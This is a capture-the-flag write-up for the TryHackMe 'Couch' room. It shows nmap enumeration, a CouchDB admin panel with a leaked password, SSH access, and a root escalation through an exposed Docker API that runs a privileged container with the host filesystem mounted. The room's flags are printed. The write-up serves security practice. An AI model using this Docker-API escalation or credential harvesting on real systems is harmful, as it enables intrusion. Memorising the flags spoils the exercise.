## Couch - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/couch)

**IP: 10.10.164.5**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan.

  ```
  nmap -sC -sV -T5 -p- 10.10.164.5

  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
  |   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
  |_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
  5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
  |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
  |_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- This will cover first 4 questions. Now, I started googling `couchdb administration panel` and found this nice [article](https://guide.couchdb.org/draft/tour.html).

- Then, I visited `_utils` and got access to admin panel. In `secret` section you can find credentials. Make sure you do `source view`.

  ```
    {
     "_id": "a1320dd69fb4570d0a3d26df4e000be7",
     "_rev": "2-57b28bd986d343cacd9cb3fca0b20c46",
     "passwordbackup": "atena:t4qfzcc4qN##"
  }
  ```
  
- Now, login with SSH and get those flags!

---

## 🧍 User Privilege Escalation

- First flag is already there, moving to escalation.

  ```
  atena@ubuntu:~$ pwd
  /home/atena
  
  atena@ubuntu:~$ ls -al
  total 48
  drwxr-xr-x 6 atena atena 4096 Dec 18  2020 .
  drwxr-xr-x 3 root  root  4096 Oct 24  2020 ..
  -rw------- 1 atena atena 3171 Dec 18  2020 .bash_history
  -rw-r--r-- 1 atena atena  220 Oct 24  2020 .bash_logout
  -rw-r--r-- 1 atena atena 3771 Oct 24  2020 .bashrc
  drwxr-xr-x 3 root  root  4096 Oct 24  2020 .bundle
  drwx------ 2 atena atena 4096 Oct 24  2020 .cache
  drwx------ 2 root  root  4096 Oct 24  2020 .gnupg
  drwxrwxr-x 2 atena atena 4096 Dec 18  2020 .nano
  -rw-r--r-- 1 atena atena  655 Oct 24  2020 .profile
  -rw-r--r-- 1 atena atena    0 Oct 24  2020 .sudo_as_admin_successful
  -rw-rw-r-- 1 atena atena   22 Dec 18  2020 user.txt
  -rw-r--r-- 1 root  root   183 Oct 24  2020 .wget-hsts
  
  atena@ubuntu:~$ cat user.txt 
  THM{1ns3cure_couchdb}
  ```

---

## 👑 Root Privilege Escalation

- Since I was already in `/home/atena`, I checked `.bash_history` file, and guess what I found?

  ```
  atena@ubuntu:~$ cat .bash_history 

  [SNIP!]
  sudo -s
  docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
  uname -a
  exit
  ```
  
- Someone is using docker. So here, I tried my basic exploits but they didn't work. In order to escalate to root, well... just run the same command from `.bash_history` file LULZ. Just wait few seconds after running it.

  ```
  atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
  / # whoami
  root
  / # id
  uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
  ```

- That's all folks, bye!

---

## 🏁 Flags

- **User Flag**: `THM{1ns3cure_couchdb}`
- **Root Flag**: `THM{RCE_us1ng_Docker_API}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, just finding my way around web admin panel.`

- What did I learn?
  `New web admin panel and another docker exploit.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
